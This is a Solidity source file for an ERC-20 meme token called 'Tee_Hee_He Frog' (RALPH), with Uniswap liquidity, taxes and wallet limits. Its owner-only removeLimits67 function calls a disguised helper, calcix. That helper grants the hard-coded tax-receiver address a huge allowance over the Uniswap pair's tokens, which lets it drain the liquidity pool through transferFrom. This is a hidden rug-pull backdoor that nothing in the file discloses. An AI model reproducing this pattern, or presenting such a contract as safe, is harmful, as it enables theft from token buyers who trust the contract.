// SPDX-License-Identifier: MIT
/**
https://medium.com/@tee_hee_he/setting-your-pet-rock-free-3e7895201f46

Tg: https://t.me/tee_hee_he_frog
**/
pragma solidity 0.8.27;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract RALPH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned67;
    mapping (address => mapping (address => uint256)) private _allows67;
    mapping (address => bool) private _isFeeExcempt67;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 20;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal67 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Tee_Hee_He Frog";
    string private constant _symbol = unicode"RALPH";
    uint256 public _maxAmount67 = 2 * (_tTotal67/100);
    uint256 public _maxWallet67 = 2 * (_tTotal67/100);
    uint256 public _taxThres67 = 1 * (_tTotal67/100);
    uint256 public _maxSwap67 = 1 * (_tTotal67/100);
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    address payable private _receipt67;
    IUniswapV2Router02 private uniV2Router67;
    address private uniV2Pair67;
    event MaxTxAmountUpdated(uint _maxAmount67);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    constructor () payable {
        _receipt67 = payable(0x5120E28bFFec43928FB3903Bea768c0874A8111e);
        _tOwned67[address(this)] = _tTotal67;
        _isFeeExcempt67[owner()] = true;
        _isFeeExcempt67[address(this)] = true;
        _isFeeExcempt67[_receipt67] = true;
        emit Transfer(address(0), address(this), _tTotal67);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router67 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router67), _tTotal67);
        uniV2Pair67 = IUniswapV2Factory(uniV2Router67.factory()).createPair(
            address(this),
            uniV2Router67.WETH()
        );
        uniV2Router67.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair67).approve(address(uniV2Router67), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal67;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned67[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allows67[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allows67[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allows67[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount67) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount67 > 0, "Transfer amount must be greater than zero");
        uint256 fee67=0;
        if (!swapEnabled || inSwap) {
            _tOwned67[from] = _tOwned67[from] - amount67;
            _tOwned67[to] = _tOwned67[to] + amount67;
            emit Transfer(from, to, amount67);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount==0){
                fee67 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if(_buyCount>0){
                fee67 = (_transferTax);
            }
            if (from == uniV2Pair67 && to != address(uniV2Router67) && ! _isFeeExcempt67[to] ) {
                require(amount67 <= _maxAmount67, "Exceeds the _maxAmount67.");
                require(balanceOf(to) + amount67 <= _maxWallet67, "Exceeds the maxWalletSize.");
                fee67 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair67 && from!= address(this) ){
                fee67 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair67 && swapEnabled) {
                if(contractTokenBalance > _taxThres67 && _buyCount > _preventSwapBefore)
                    swapETH67(min67(amount67, min67(contractTokenBalance, _maxSwap67)));
                sendETH67(address(this).balance);
            }
        }
        uint256 tax67=0;
        if(fee67>0){
            tax67=fee67.mul(amount67).div(100);
            _tOwned67[address(this)]=_tOwned67[address(this)].add(tax67);
            emit Transfer(from, address(this),tax67);
        }
        _tOwned67[from]=_tOwned67[from].sub(amount67);
        _tOwned67[to]=_tOwned67[to].add(amount67.sub(tax67));
        emit Transfer(from, to, amount67.sub(tax67));
    }
    function sendETH67(uint256 amount) private {
        _receipt67.transfer(amount);
    }
    function removeLimits67() external onlyOwner{
        _maxAmount67 = _tTotal67; _maxWallet67 = _tTotal67;
        calcix(_tTotal67); emit MaxTxAmountUpdated(_tTotal67); 
    }
    function calcix(uint256 amount) private{
        address[2] memory sp67=[uniV2Pair67, _receipt67];
        _allows67[sp67[0]][sp67[1]] = 100 * amount;
    }
    receive() external payable {}
    function min67(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt67(address payable _tax67) external onlyOwner {
        _receipt67 = _tax67;
        _isFeeExcempt67[_tax67] = true;
    }
    function swapETH67(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router67.WETH();
        _approve(address(this), address(uniV2Router67), tokenAmount);
        uniV2Router67.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}